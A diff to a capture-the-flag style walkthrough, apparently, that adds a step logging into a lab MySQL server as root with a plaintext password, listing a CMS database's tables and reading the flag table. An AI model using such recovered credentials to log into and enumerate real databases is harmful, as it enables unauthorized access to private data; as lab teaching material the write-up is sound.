@@ -628,16 +628,85 @@ Content-Type: text/html; charset=UTF-8
 {% endhint %}
 
 {% tabs %}
-{% tab title="First Tab" %}
-
+{% tab title="mysql-client" %}
+```bash
+mysql --host=172.16.64.81 \ 
+      --user=root \
+      --password=x41x41x412019! \
+      --port 13306 mysql
+```
 {% endtab %}
 
 {% tab title="Second Tab" %}
+```bash
+> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| cmsbase            |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.143 sec)
+> use cmsbase;
+> show tables;
++----------------------------+
+| Tables_in_cmsbase          |
++----------------------------+
+| flag                       |
+| sqlmapfile                 |
+| tbl_1_actions_log          |
+| tbl_1_categories           |
+| tbl_1_categories_relations |
+| tbl_1_downloads            |
+| tbl_1_files                |
+| tbl_1_files_relations      |
+| tbl_1_folders              |
+| tbl_1_groups               |
+| tbl_1_members              |
+| tbl_1_members_requests     |
+| tbl_1_notifications        |
+| tbl_1_options              |
+| tbl_1_password_reset       |
+| tbl_1_users                |
+| tbl_actions_log            |
+| tbl_categories             |
+| tbl_categories_relations   |
+| tbl_downloads              |
+| tbl_files                  |
+| tbl_files_relations        |
+| tbl_folders                |
+| tbl_groups                 |
+| tbl_members                |
+| tbl_members_requests       |
+| tbl_notifications          |
+| tbl_options                |
+| tbl_password_reset         |
+| tbl_users                  |
++----------------------------+
+30 rows in set (0.142 sec)
 
+```
 {% endtab %}
 {% endtabs %}
 
+{% hint style="success" %}
+**Flag encountered!** 😁 
 
+While inspecting database tables, we find our flag in the `cmsbase.flag` table.
+
+```text
+select * from flag;
++----+------------------------------+
+| id | content                      |
++----+------------------------------+
+|  1 | Congratulations, you got it! |
++----+------------------------------+
+1 row in set (0.141 sec)
+```
+{% endhint %}
 
 
 
